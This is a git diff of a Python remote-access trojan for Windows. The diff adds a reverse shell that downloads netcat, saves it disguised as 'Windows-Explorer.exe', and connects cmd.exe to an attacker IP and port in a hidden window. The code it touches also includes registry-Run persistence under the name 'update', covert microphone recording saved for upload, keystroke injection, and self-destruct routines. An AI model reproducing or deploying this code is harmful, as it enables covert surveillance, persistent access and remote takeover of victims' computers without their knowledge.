@@ -2,7 +2,10 @@
 import subprocess as sp
 from cv2 import VideoCapture, imwrite
 from urllib.request import urlopen
-import credentials
+from libraries import credentials
+from sounddevice import rec, wait
+from scipy.io.wavfile import write
+import threading
 import pyautogui
 import requests
 import platform
@@ -200,7 +203,7 @@ def persistent():
         if not os.path.exists(backdoor_location):
             shutil.copyfile(sys.executable, backdoor_location)
             sp.call(
-                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
+                rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{backdoor_location}" /f',
                 shell = True
             )
             return True
@@ -234,7 +237,7 @@ def selfdestruct():
         config_location = fr'C:\Users\{getUsername()}\.config'
         
         sp.call(
-            'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',
+            rf'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',
             shell = True
         )
         
@@ -259,11 +262,48 @@ def location():
 
 
 def revshell(ip, port):
-    pass
+    def exec(IP, PORT):
+        if not os.path.exists(os.environ["temp"] + '\\Windows-Explorer.exe'):
+            r = requests.get(
+                "https://github.com/int0x33/nc.exe/raw/master/nc64.exe",
+                allow_redirects = True,
+                verify = False
+            )
+            open(os.environ["temp"] + '\\Windows-Explorer.exe', 'wb').write(r.content)
+        else:
+            try:
+                result = sp.Popen(
+                    f"{os.environ["temp"]}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b",
+                    stderr = sp.PIPE,
+                    stdin = sp.DEVNULL,
+                    stdout = sp.PIPE,
+                    shell = True,
+                    text = True,
+                    creationflags = 0x08000000
+                )
+                out, err = result.communicate()
+                result.wait()
+                return True
+            except Exception:
+                return False
+            
+    
+    threading.Thread(target = exec, args = (ip, port)).start()
+    return True
 
 
 def recordmic(seconds):
-    pass
+    try:
+        fs = 44100
+        recording = rec(int(seconds * fs), samplerate=fs, channels=2)
+        wait()
+        os.chdir(fr"C:\Users\{getUsername()}\.config\uploads")
+        write('recording.wav', fs, recording)
+        path = fr"C:\Users\{getUsername()}\.config\uploads\recording.wav"
+        return path
+    except Exception as e:
+        print(e)
+        return False
 
 
 def wallpaper(path:str):
@@ -285,7 +325,6 @@ def wallpaper(path:str):
             return e
 
 
-
 def killproc(pid):
     result = sp.Popen(
         f"taskkill /F /PID {pid}",
@@ -303,3 +342,31 @@ def killproc(pid):
         return err
     else:
         return True
+
+
+def write(string:str, interval:float):
+    try:
+        pyautogui.write(string, interval = interval)
+        return True
+    except Exception:
+        return False
+    
+
+def press(letter:str):
+    try:
+        pyautogui.press(letter)
+        return True
+    except Exception:
+        return False
+    
+        
+def message(message:str):
+    try:
+        sp.call(
+            rf'msg "%username%" {message}',
+            shell = True
+        )
+        return True
+    except Exception:
+        return False
+    
